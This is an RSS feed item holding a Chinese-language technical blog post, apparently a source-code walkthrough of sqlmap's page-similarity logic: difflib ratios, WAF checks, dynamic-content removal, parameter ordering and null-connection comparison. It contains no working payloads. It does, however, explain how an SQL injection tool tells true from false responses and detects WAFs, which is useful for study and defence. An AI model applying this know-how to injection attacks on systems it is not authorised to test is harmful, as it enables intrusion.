<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Wed, 12 Sep 2018 03:14:15 +0800</lastBuildDate>
<item>
<title>sqlmap 内核分析 II: 核心原理-页面相似度算法实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-10-44157153.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44157153&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8189a97bf692ad57084cd2d670824522_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在上一篇文章中，我们在 &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; 中戛然而止于 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 这一个概念；但是在本文，笔者会详细介绍 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 对于 sqlmap 整个系统的重要意义和用法，除此之外还会指出一些 sqlmap 的核心逻辑和一些拓展性的功能。包含：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;identityWaf&lt;/li&gt;&lt;li&gt;nullConnection (checkNullConnection)&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x00 PageRatio 是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;要说 PageRatio 是什么，我们可能需要先介绍另一个模块 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt;。这个模块是在 sqlmap 中用来计算页面的相似度的基础模块，实际处理的时候，sqlmap 并不仅仅是直接计算页面的相似度，而是通过首先对页面进行一些预处理，预处理之后，根据预设的阈值来计算请求页面和模版页面的相似度。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt; 模块其实本身并没有什么非常特殊的，详细参见&lt;a href=&quot;https://docs.python.org/2/library/difflib.html&quot;&gt;官方手册&lt;/a&gt;，实际在使用的过程中，sqlmap 主要使用其 &lt;code class=&quot;inline&quot;&gt;SequenceMatcher&lt;/code&gt; 这个类。以下是关于这个类的简单介绍：&lt;/p&gt;&lt;blockquote&gt;This is a flexible class for comparing pairs of sequences of any type, so long as the sequence elements are hashable. The basic algorithm predates, and is a little fancier than, an algorithm published in the late 1980’s by Ratcliff and Obershelp under the hyperbolic name “gestalt pattern matching.” The idea is to find the longest contiguous matching subsequence that contains no “junk” elements (the Ratcliff and Obershelp algorithm doesn’t address junk). The same idea is then applied recursively to the pieces of the sequences to the left and to the right of the matching subsequence. This does not yield minimal edit sequences, but does tend to yield matches that “look right” to people.&lt;/blockquote&gt;&lt;p&gt;简单来说这个类使用了 Ratcliff 和 Obershelp 提供的算法，匹配最长相同的字符串，设定无关字符（junk）。在实际使用中，他们应用最多的方法应该就是 &lt;code class=&quot;inline&quot;&gt;ratio()&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e5dbeda98af8e9230aa17a3cdd8ceba7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1589&quot; data-rawheight=&quot;139&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据文档中的描述，这个方法返回两段文本的相似度，相似度的算法如下：我们假设两段文本分别为 &lt;code class=&quot;inline&quot;&gt;text1&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;text2&lt;/code&gt;，他们相同的部分长度总共为 &lt;code class=&quot;inline&quot;&gt;M&lt;/code&gt;，这两段文本长度之和为 &lt;code class=&quot;inline&quot;&gt;T&lt;/code&gt;，那么这两段文本的相似度定义为 &lt;code class=&quot;inline&quot;&gt;2.0 * M / T&lt;/code&gt;，这个相似度的值在 0 到 1.0 之间。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PageRatio 的小例子&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4ca7c268277f6f9afbe5b194d24796dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;481&quot; data-rawheight=&quot;229&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4ca7c268277f6f9afbe5b194d24796dc&quot; data-watermark-src=&quot;v2-284abfab7f0d229fa22bf82cae412512&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们通过上面的介绍，知道了对于 &lt;code class=&quot;inline&quot;&gt;abcdefg&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;abce123&lt;/code&gt; 我们计算的结果应该是 &lt;code class=&quot;inline&quot;&gt;2.0 * 4 / 14&lt;/code&gt; 所以计算结果应该是：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33d7ed32fcaeee58a5f0b418666567f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;37&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;到现在我们理解了 PageRatio 是什么样的一种算法，我们就可以开始观察 sqlmap 是如何使用这一个值的了～&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 RATIO in checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在上节的内容中，我们对于 sqlmap 的源码了解到 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 的部分，结合刚才讲的 PageRatio 的例子，我们直接可以看懂这部分代码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0daf035189288e98edbec8cf7cb500f8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1186&quot; data-rawheight=&quot;185&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;现在设定 &lt;code class=&quot;inline&quot;&gt;IDS_WAF_CHECK_RATIO = 0.5&lt;/code&gt; 表明，只要打了检测 IDS/WAF 的 Payload 的页面结果与模版页面结果文本页面经过一定处理，最后比较出相似度相差 0.5 就可以认为触发了 IDS/WAF。&lt;/p&gt;&lt;p&gt;与 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 相关的其实还有 &lt;code class=&quot;inline&quot;&gt;identityWaf&lt;/code&gt;, 但是这个方法太简单了我们并不想仔细分析，有兴趣的读者可以自行了解一下，本文选择直接跳过这一个步骤。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 checkStability&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数其实是在检查原始页面是存在动态内容，并做一些处理。何为动态内容？在 sqlmap 中表示以同样的方式访问量次同一个页面，访问前后页面内容并不是完全相同，他们相差的内容属于动态内容。当然，sqlmap 的处理方式也并不是随意的比较两个页面就没有然后了，在比较完之后，如果存在动态页面，还会做一部分的处理，或者提出扩展设置（&lt;code class=&quot;inline&quot;&gt;--string/--regex&lt;/code&gt;），以方便后续使用。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1440e57d7b4efd880a250213aa64f20e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1184&quot; data-rawheight=&quot;780&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1440e57d7b4efd880a250213aa64f20e&quot; data-watermark-src=&quot;v2-fbc8433d6a32ac6eb6edb03beb65f110&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现，实际的 sqlmap 源码确实是按照我们介绍的内容处理的，如果页面内容是动态的话，则会提示用户处理字符串或者增加正则表达式来验证页面。&lt;/p&gt;&lt;blockquote&gt;默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;checkDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们发现，如果说我们并没指定 &lt;code class=&quot;inline&quot;&gt;string / regex&lt;/code&gt; 那么很多情况，我们仍然也可以正确得出结果；根据 sqlmap 源码，它实际上背后还是有一些处理方法的，而这些方法就在 &lt;code class=&quot;inline&quot;&gt;checkDynamicContent(firstPage, secondPage)&lt;/code&gt; 中：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d809fdef4992d3325d0eb191a29b70a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1188&quot; data-rawheight=&quot;699&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5d809fdef4992d3325d0eb191a29b70a&quot; data-watermark-src=&quot;v2-42eaf7b0265856ba73b5d5345e111776&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们在这个函数中发现如果 &lt;code class=&quot;inline&quot;&gt;firstPage 和 secondPage&lt;/code&gt; 的相似度小于 0.98 （这个相似度的概念就是前一节介绍的 PageRatio 的概念），则会重试，并且尝试 &lt;code class=&quot;inline&quot;&gt;findDynamicContent(firstPage, secondPage)&lt;/code&gt; 然后细化页面究竟是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是 &lt;code class=&quot;inline&quot;&gt;heavily dynamic&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果页面是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 则提示启用 &lt;code class=&quot;inline&quot;&gt;--text-only&lt;/code&gt; 选项：&lt;/p&gt;&lt;blockquote&gt;有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。&lt;/blockquote&gt;&lt;p&gt;如果页面仅仅是显示 &lt;code class=&quot;inline&quot;&gt;heavy dynamic&lt;/code&gt; 的话，sqlmap 会不断重试直到区分出到底是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是普通的可以接受的动态页面（相似度大于 0.98）。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 与可以接受的动态页面（相似度高于 0.98），其实最根本的区别就是在于 PageRatio, 如果多次尝试（超过 conf.retries） 设置的尝试次数，仍然出现了相似度低于 0.98 则会认为这个页面 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;findDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;common.py&lt;/code&gt; 中，这个函数作为通用函数，我们并不需要非常严格的去审他的源码，为了节省大家的时候，笔者在这里可以描述这个函数做了一件什么样的事情，并举例说明。&lt;/p&gt;&lt;p&gt;这个函数按函数名来解释其实是，寻找动态的页面内容。&lt;/p&gt;&lt;p&gt;实际在工作中，如果寻找到动态内容，则会将动态内容的前后内容（前：&lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt;，后：&lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，长度均在 &lt;code class=&quot;inline&quot;&gt;DYNAMICITY_BOUNDARY_LENGTH&lt;/code&gt; 中设定，默认为 20）作为一个 tuple，存入 &lt;code class=&quot;inline&quot;&gt;kb.dynamicMarkings&lt;/code&gt;，在每一次页面比较之前，会默认移除这些动态内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;kb.dynamicMarkings.append((prefix if prefix else None, suffix if suffix else None))&lt;/code&gt;&lt;p&gt;例如，在实际使用中，我们按照官方给定的一个例子：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    &quot;&quot;&quot;
    This function checks if the provided pages have dynamic content. If they
    are dynamic, proper markings will be made
                          
    &amp;gt;&amp;gt;&amp;gt; findDynamicContent(&quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;, 
                           &quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. &amp;lt;script src=&#39;ads.js&#39;&amp;gt;&amp;lt;/script&amp;gt;Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;)
    &amp;gt;&amp;gt;&amp;gt; kb.dynamicMarkings
    [(&#39;natum reque et per. &#39;, &#39;Facer tritani repreh&#39;)]
    &quot;&quot;&quot;&lt;/code&gt;&lt;p&gt;根据观察，两段文本差别在 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，标记的动态内容应该是 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，所以动态内容的前 20 字节的文本座位 &lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt; 后 20 字节的文本作为 &lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，分别为：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;prefix: &lt;code class=&quot;inline&quot;&gt;&#39;natum reque et per. &#39;&lt;/code&gt;&lt;/li&gt;&lt;li&gt;suffix: &lt;code class=&quot;inline&quot;&gt;&#39;Facer tritani repreh&#39;&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x03 中场休息与阶段性总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们虽然之分析了两个大函数，但是整个判断页面相应内容的核心原理应该是已经非常清晰了；可能有些读者反馈我们的进度略慢，但是其实这好比一个打基础的过程，我们基础越扎实对 sqlmap 越熟悉，分析后面的部分就越快。&lt;/p&gt;&lt;p&gt;为了更好的继续，我们需要回顾一下之前的流程图&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09f240e25764349996a613036b3e4b0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09f240e25764349996a613036b3e4b0a&quot; data-watermark-src=&quot;v2-c58c5090cd22742c8b9f9698636c40c3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;好的，接下来我们的目标就是图中描述的部分“过滤重复以及不需要检查的参数，然后检查参数是为动态参数”，在下一篇文章中，我们将会详细介绍 sqlmap 其他的核心函数，诸如启发式检测，和 sql 注入检测核心函数。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 参数预处理以及动态参数检查&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;参数预处理&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;参数预处理包含如下步骤：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;参数排序&lt;br&gt;# Order of testing list (first to last)&lt;br&gt;orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)&lt;br&gt;​&lt;br&gt;for place in orderList[::-1]:&lt;br&gt; if place in parameters:&lt;br&gt; parameters.remove(place)&lt;br&gt; parameters.insert(0, place)&lt;/li&gt;&lt;li&gt;参数分级检查&lt;br&gt;&lt;br&gt;for place in parameters:&lt;br&gt; # Test User-Agent and Referer headers only if&lt;br&gt; # --level &amp;gt;= 3&lt;br&gt; skip = (place == PLACE.USER_AGENT and conf.level &amp;lt; 3)&lt;br&gt; skip |= (place == PLACE.REFERER and conf.level &amp;lt; 3)&lt;br&gt;​&lt;br&gt; # Test Host header only if&lt;br&gt; # --level &amp;gt;= 5&lt;br&gt; skip |= (place == PLACE.HOST and conf.level &amp;lt; 5)&lt;br&gt;​&lt;br&gt; # Test Cookie header only if --level &amp;gt;= 2&lt;br&gt; skip |= (place == PLACE.COOKIE and conf.level &amp;lt; 2)&lt;br&gt;​&lt;br&gt; skip |= (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.COOKIE and intersect(PLACE.COOKIE, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.HOST and intersect(PLACE.HOST, conf.skip, True) not in ([], None))&lt;br&gt;​&lt;br&gt; skip &amp;amp;= not (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.HOST and intersect(HOST_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.COOKIE and intersect((PLACE.COOKIE,), conf.testParameter, True))&lt;br&gt;​&lt;br&gt; if skip:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if kb.testOnlyCustom and place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if place not in conf.paramDict:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; paramDict = conf.paramDict[place]&lt;br&gt;​&lt;br&gt; paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place&lt;/li&gt;&lt;li&gt;参数过滤&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3449ea6acc9fc11700479e927f570242_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1490&quot; data-rawheight=&quot;728&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3449ea6acc9fc11700479e927f570242&quot; data-watermark-src=&quot;v2-ff650ae113fc375acf08cf0865584366&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;checkDynParam(place, parameter, value)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们进入 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 函数发现，整个函数其实看起来非常简单，但是实际上我们发现 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 这个函数现在又返回了一个好像是 Bool 值的返回值作为 &lt;code class=&quot;inline&quot;&gt;dynResult&lt;/code&gt; 这令我们非常困惑，我们上一次见这个函数返回的是 &lt;code class=&quot;inline&quot;&gt;(page, headers, code)&lt;/code&gt; 。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16ff2abb515c255ba3be9619c11251d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1117&quot; data-rawheight=&quot;664&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b16ff2abb515c255ba3be9619c11251d&quot; data-watermark-src=&quot;v2-eb0503c02fa3ede2b68a866725b03bed&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现实际上的页面比较逻辑也并不是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; ，所以表面上，我们这一节的内容是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 这个函数，但是实际上我们仍然需要跟进到 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;那么，等什么呢？继续吧！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;agent.queryPage 与 comparison&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;跟进 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 我相信一定是痛苦的，这其实算是 sqlmap 的核心基础函数之一，里面包含了接近三四百行的请求前预处理，包含 &lt;code class=&quot;inline&quot;&gt;tamper&lt;/code&gt; 的处理逻辑以及随机化参数和 CSRF 参数的处理检测逻辑。同时如果涉及到了 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 还包含着时间盲注的处理逻辑；除此之外，一般情况下 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中还存在着针对页面比较的核心调用，页面对比对应函数为 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt;。为了简化大家的负担，笔者只截取最后返回值的部分 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-31010288239691eb6dbbbbeaa5f4d255_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1620&quot; data-rawheight=&quot;424&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31010288239691eb6dbbbbeaa5f4d255&quot; data-watermark-src=&quot;v2-f06c7f596d8bd6637e5dc5d992635f19&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在标注中，我们发现了我们之前的疑问，为什么 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 时而返回页面内容，时而返回页面与模版页面的比较结果。其实在于如果 &lt;code class=&quot;inline&quot;&gt;content/response&lt;/code&gt; 被设置为 &lt;code class=&quot;inline&quot;&gt;True&lt;/code&gt; 的时候，则会返回页面具体内容，headers，以及响应码；如果 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 被设定的时候，返回是否发生了延迟；默认情况返回与模版页面的比较结果。&lt;/p&gt;&lt;p&gt;我们发现这一个 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 函数很奇怪，他没有输入两个页面的内容，而是仅仅输入当前页面的相关信息，但是为什么笔者要明确说是与“模版页面”的比较结果呢？我们马上就跟入 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 一探究竟。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e87a24d60d2cbb3614eecfd760d55c6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1077&quot; data-rawheight=&quot;449&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e87a24d60d2cbb3614eecfd760d55c6b&quot; data-watermark-src=&quot;v2-3a5937b488503b66381fb28faea64e7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;进去之后根据图中的调用关系，我们主要需要观察一下 &lt;code class=&quot;inline&quot;&gt;_comparison&lt;/code&gt; 这个函数的行为。当打开这个函数的时候，我们发现也是一段接近一百行的函数，仍然是一个需要硬着头皮看下去的一段代码。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6bbd0c8d31d584f2b44c3d56b1ddc513_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1112&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6bbd0c8d31d584f2b44c3d56b1ddc513&quot; data-watermark-src=&quot;v2-ae634362bd18d5ac79886e5721995c28&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据图中的使用红色方框框住的代码，我们很容易就能发现，这其实是在禁用 &lt;code class=&quot;inline&quot;&gt;PageRatio&lt;/code&gt; 的页面相似度算法，而是因为用户设定了 &lt;code class=&quot;inline&quot;&gt;--string/--not-string/--regex/--code&lt;/code&gt; 从而可以明确从其他方面区分出页面为什么不同。当然，我们的重点并不是他，而是计算 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 并且使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 得出页面相似的具体逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d3093ad48167b9ec3f755d23f26b274_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;822&quot; data-rawheight=&quot;487&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d3093ad48167b9ec3f755d23f26b274&quot; data-watermark-src=&quot;v2-27af2f2d71d73d24571e676a27ea0074&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我相信令大家困惑的可能是这两段关于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 的代码，在前面的部分中，我们没有详细说明 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 究竟意味着什么：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;
  Optimization:
    These options can be used to optimize the performance of sqlmap
​
    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)&lt;/code&gt;&lt;p&gt;根据官方手册的描述，&lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 是一种不用获取页面内容就可以知道页面大小的方法，这种方法在布尔盲注中有非常好的效果，可以很好的节省带宽。具体的原理详见&lt;a href=&quot;http://www.wisec.it/sectou.php?id=472f952d79293&quot;&gt;这一片古老的文章&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;明白这一点，上面的代码就变得异常好懂了，如果没有启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt; 优化，两次比较的页面分别为 &lt;code class=&quot;inline&quot;&gt;page&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt;。其实 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt; 也并不陌生，其实就是第一次正式访问页面的时候，存下的那个页面的内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
conf.originalPage = kb.pageTemplate = page&lt;/code&gt;&lt;p&gt;如果启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt;，计算 ratio 就只是很简单的通过页面的长度来计算，计算公式为 &lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
ratio = 1. * pageLength / len(kv.pageTemplate)
​
if ratio &amp;gt; 1.:
    ratio = 1. / ratio&lt;/code&gt;&lt;p&gt;接下来我们再顺着他的逻辑往下走：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fe348699c782f91fd21c2a65027dccb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;650&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fe348699c782f91fd21c2a65027dccb9&quot; data-watermark-src=&quot;v2-c5ec57535b9e20fd12d85af9c4971566&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据上面对源码的标注，我们很容易理解这个 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 是怎么算出来的，同样我们也很清楚，其实并不只是简单无脑的使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 就可以起到很好的效果，配合各种各样的选项或者预处理：比如移除页面的动态内容，只比较 &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt;，只比较文本，不比较 &lt;code class=&quot;inline&quot;&gt;html&lt;/code&gt; 标签。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cb294971e4a5551406807509e464c70_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1182&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8cb294971e4a5551406807509e464c70&quot; data-watermark-src=&quot;v2-8f38bc19f35863fd650048845660cbf7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上面源码为最终使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 对页面的相似度作出判断的逻辑，其中&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
UPPER_RATIO_BOUND = 0.98
LOWER_RATIO_BOUND = 0.02
